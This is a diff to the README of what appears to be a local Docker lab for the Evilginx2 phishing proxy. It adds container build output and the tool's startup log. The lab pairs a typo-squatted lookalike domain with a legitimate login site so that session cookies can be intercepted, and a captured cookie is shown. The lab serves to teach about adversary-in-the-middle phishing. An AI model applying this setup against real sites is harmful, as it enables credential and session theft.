@@ -24,10 +24,19 @@ Our goal is to intercept the authentication tokens (cookies) needed to hijack th
 Clone this repo and enter the directory, then execute:
 	
 	sudo docker-compose up --build -d --force-recreate --remove-orphans
+	Building apache-php
+	[+] Building 1.1s (11/11) FINISHED
+	...
+	Building evilginx2
+	[+] Building 1.1s (10/10) FINISHED   
+	...
+	Creating targetsite.local ... done
+	Creating targetsile.local ... done
+
 	
 Verify the containers:
 
-	docker ps
+	sudo docker ps
 	CONTAINER ID   IMAGE                          COMMAND                  CREATED          STATUS          PORTS               NAMES
 	636fa17740bf   evilginx_lab-main_apache-php   "apachectl -D FOREGR…"   41 minutes ago   Up 41 minutes   80/tcp, 443/tcp     targetsite.local
 	2c595290c650   evilginx_lab-main_evilginx2    "/bin/bash -l"           41 minutes ago   Up 41 minutes   443/tcp, 8080/tcp   targetsile.local
@@ -38,6 +47,7 @@ Modify hosts file in your host machine. Add the following lines:
 
 	172.18.0.20 	targetsite.local login.targetsite.local
 	172.18.0.10	targetsile.local login.targetsile.local
+	
 Visit the Legitimate site at: https://login.targetsite.local, with a bit of typo-squatting, the evil site will be https://login.targetsile.local
 
 
@@ -47,8 +57,45 @@ Enter Evilginix container shell
 	sudo docker exec -it /targetsile.local /bin/bash
 Then start Evilginix in developer mode, in this mode, instead of trying to obtain LetsEncrypt SSL/TLS certificates, it will automatically generate self-signed certificates.
 ```bash  
-root@bd1cc49349a5:/evilginx2# ./evilginx2 -developer -debug
-TOADD
+
+root@e279e8098a4d:/evilginx2# ./evilginx2 -debug -developer
+
+                                         
+                                             ___________      __ __           __               
+                                             \_   _____/__  _|__|  |    ____ |__| ____ ___  ___
+                                              |    __)_\  \/ /  |  |   / __ \|  |/    \\  \/  /
+                                              |        \\   /|  |  |__/ /_/  >  |   |  \>    < 
+                                             /_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
+                                                     \/              /_____/         \/      \/
+                                         
+                                                        - --  Community Edition  -- -
+                                         
+                                               by Kuba Gretzky (@mrgretzky)     version 3.3.0
+                                         
+
+[15:32:34] [inf] Evilginx Mastery Course: https://academy.breakdev.org/evilginx-mastery (learn how to create phishlets)
+[15:32:34] [inf] debug output enabled
+[15:32:34] [inf] loading phishlets from: /evilginx2/phishlets
+[15:32:34] [inf] loading configuration from: /root/.evilginx
+[15:32:34] [inf] blacklist mode set to: unauth
+[15:32:34] [inf] unauthorized request redirection URL set to: https://www.youtube.com/watch?v=dQw4w9WgXcQ
+[15:32:34] [inf] https port set to: 443
+[15:32:34] [inf] dns port set to: 53
+[15:32:34] [inf] autocert is now enabled
+[15:32:34] [inf] blacklist: loaded 0 ip addresses and 0 ip masks
+[15:32:34] [war] server domain not set! type: config domain <domain>
+[15:32:34] [war] server external ip not set! type: config ipv4 external <external_ipv4_address>
+
++-------------------+-----------+-------------+-----------+-------------+
+|     phishlet      |  status   | visibility  | hostname  | unauth_url  |
++-------------------+-----------+-------------+-----------+-------------+
+| example           | disabled  | visible     |           |             |
+| targetsite-local  | disabled  | visible     |           |             |
++-------------------+-----------+-------------+-----------+-------------+
+
+:  
+
+
 ```
                                         
 ## Config Evilngnix container
@@ -108,10 +155,8 @@ TOADD
 [ cookies ]
 [{"path":"/","domain":"login.targetsite.local","expirationDate":1764884081,"value":"jkncga8d8e6fk3igla22ugsfse--very-insecure-fixed-VALUE--DO-NOT-USE-IT-NEVER-IN-REAL-APPLICATION","name":"session_token","httpOnly":true,"hostOnly":true}]
 
-
-
-
 ```
+
 ## Useful Docker commands
 
 ### Stop and remove all the containers
